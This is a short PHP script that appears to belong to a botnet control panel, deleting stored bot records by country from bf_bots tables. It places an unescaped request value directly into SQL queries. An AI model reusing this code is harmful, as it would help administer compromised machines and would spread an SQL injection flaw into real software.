<?php

$counts = $mysqli->query_name('SELECT COUNT(*) count FROM bf_bots WHERE (country=\''.$Cur['str'].'\')');

if($counts > 0){
	if(function_exists('save_history_log')){
		thl('Action: Delete Country Bots');
		thl('Country: ' . $Cur['str']);
		save_history_log();
	}
	
	if($_SESSION['user']->config['hunter_limit'] == true){
		$mysqli->query("delete from bf_bots WHERE (country='".$Cur['str']."') AND (post_id = '".$_SESSION['user']->id."')");
		$mysqli->query("delete from bf_bots_ip WHERE (country='".$Cur['str']."') AND (post_id = '".$_SESSION['user']->id."')");
	}else{
		$mysqli->query("delete from bf_bots WHERE (country='".$Cur['str']."')");
		$mysqli->query("delete from bf_bots_ip WHERE (country='".$Cur['str']."')");
	}
}

header('Location: /bots/index.html?ajax=' . $Cur['ajax'] . '&page=' . $Cur['page']);
exit;

?>